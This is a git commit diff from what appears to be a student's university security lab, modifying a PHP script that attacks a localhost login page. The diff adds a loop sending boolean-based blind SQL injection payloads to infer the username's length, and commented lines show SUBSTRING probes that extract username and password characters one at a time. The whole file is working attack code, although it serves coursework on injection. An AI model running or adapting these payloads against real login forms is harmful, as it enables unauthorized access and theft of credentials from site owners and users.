71f4c2270e7f5a830ebc08d5330a36524eabeafb
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-16 13:23:11 +0200

    test

--- script.php
+++ script.php
@@ -3,29 +3,33 @@
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"
 
-$i = 3;
+//$i = 3;
 
-$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
-/*$counter = 0;
+$counter = 0;
 while ($counter < 25)
 {
-    
-}*/
+    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$counter--%20";
+	
+
+    $result = file_get_contents($url);
+
+	print($result);
 
 
-
-$result = file_get_contents($url);
-
-print($result);
-
-
-if (strpos($result, 'cat') !== false) {
-	echo "\n";
-	echo 'true';
-}else{
-	echo "\n";
-	echo "nope";
+	if (strpos($result, 'cat') !== false) {
+		echo "\n";
+		echo 'true';
+		echo "\n";
+		echo "size $counter";
+	}else{
+		echo "\n";
+		echo "nope";
+	}
 }
+
+
+
+
 
 echo "\n";
 
